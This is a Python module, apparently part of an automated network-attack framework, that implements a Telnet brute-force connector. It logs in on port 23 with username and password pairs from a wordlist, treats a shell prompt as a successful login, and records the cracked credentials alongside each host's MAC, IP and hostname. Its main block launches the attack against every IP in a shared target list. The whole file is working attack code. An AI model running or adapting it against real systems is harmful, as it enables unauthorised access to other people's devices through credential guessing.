"""
telnet_connector.py — Telnet brute force (port 23).

Thin adapter over BaseConnector (#12). Only attempt() and the module-level
b_* discovery globals live here; queue/worker/run_bruteforce are shared.
"""
import logging
import telnetlib
import time
from base_connector import BaseConnector, BaseBruteforce
from logger import Logger

logger = Logger(name="telnet_connector.py", level=logging.DEBUG)

b_class = "TelnetBruteforce"
b_module = "telnet_connector"
b_status = "brute_force_telnet"
b_port = 23
b_parent = None


class TelnetConnector(BaseConnector):
    PORT = 23
    HEADER = "MAC Address,IP Address,Hostname,User,Password,Port\n"
    OUTFILE_ATTR = "telnetfile"
    PROGRESS_LABEL = "Telnet"
    QUEUE_HAS_MAC = True

    def attempt(self, adresse_ip, user, password):
        """Log in over Telnet. Only a shell prompt counts as success.

        The ctor timeout (#4) covers the TCP connect; the read_until/expect timeouts cover the
        protocol exchange. Without the ctor bound a black-holed host hangs the worker before any
        read_until fires. A non-ASCII wordlist entry makes .encode('ascii') raise — caught here and
        reported as a failed login rather than killing the worker.
        """
        try:
            tn = telnetlib.Telnet(adresse_ip, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")

            # Give the far end a moment to answer before classifying the response.
            time.sleep(2)
            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
            tn.close()

            # Index 2/3 are the `$ ` and `# ` shell prompts. 0 is an explicit rejection and 1 is a
            # re-prompt for the password — both failures, as is anything else (-1 = no match).
            if response[0] == 2 or response[0] == 3:
                return True
        except Exception:
            pass
        return False


class TelnetBruteforce(BaseBruteforce):
    connector_class = TelnetConnector
    display_name = "TelnetBruteforce"


if __name__ == "__main__":
    from shared import SharedData
    shared_data = SharedData()
    try:
        telnet_bruteforce = TelnetBruteforce(shared_data)
        logger.info("Starting Telnet brute-force attack on port 23...")
        for row in shared_data.read_data():
            ip = row["IPs"]
            logger.info(f"Executing TelnetBruteforce on {ip}...")
            telnet_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total number of successes: {len(telnet_bruteforce.connector.results)}")
    except Exception as e:
        logger.error(f"Error: {e}")
